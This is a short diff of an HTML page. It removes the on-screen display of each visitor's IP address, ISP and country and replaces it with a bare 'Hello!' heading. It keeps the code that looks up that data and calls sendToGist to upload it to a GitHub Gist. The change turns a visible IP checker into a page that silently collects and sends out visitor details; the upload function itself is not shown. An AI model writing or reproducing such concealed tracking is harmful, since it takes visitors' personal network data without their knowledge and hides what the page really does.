@@ -4,11 +4,7 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 </head>
 <body>
-    IP Address = <span id="ip"></span>
-    <br>
-    ISP = <span id="isp"></span>
-    <br>
-    Country = <span id="country"></span>
+    <h1>Hello!</h1>
 
     <script>
         // Declare variables to store data
@@ -20,11 +16,6 @@
             ipAddress = data.ip;
             isp = data.org;
             country = data.country_name;
-
-            // Update HTML elements with the variables
-            $('#ip').text(ipAddress);
-            $('#isp').text(isp);
-            $('#country').text(country);
 
             // Send data to GitHub Gist
             sendToGist(ipAddress, isp, country);
